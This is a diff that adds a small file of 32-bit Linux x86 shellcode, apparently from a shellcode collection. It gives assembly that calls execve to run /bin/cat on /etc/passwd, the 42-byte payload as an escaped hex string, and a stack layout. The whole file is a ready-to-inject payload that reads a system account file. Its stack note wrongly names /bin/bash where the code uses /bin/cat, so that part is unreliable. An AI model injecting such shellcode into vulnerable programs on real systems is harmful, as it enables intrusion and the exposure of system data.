@@ -1,0 +1,30 @@
+-------------------------------
+Open /etc/passwd with /bin/cat
+-------------------------------
+
+xor    eax,eax
+push   eax
+push   0x7461632f
+push   0x6e69622f
+mov    ebx,esp
+push   eax
+push   0x64777373
+push   0x61702f2f
+push   0x6374652f
+mov    ecx,esp
+push   eax
+push   ecx
+push   ebx
+mov    ecx,esp
+mov    al,0xb
+int    0x80
+
+Lenght: 42
+
+"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68"
+"\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+
+From the stack :
+
+[ecx] @/bin/bash @/etc/passwd 0 [ecx=esp] /etc/passwd [eax] [ebx=esp] /bin/bash [eax]
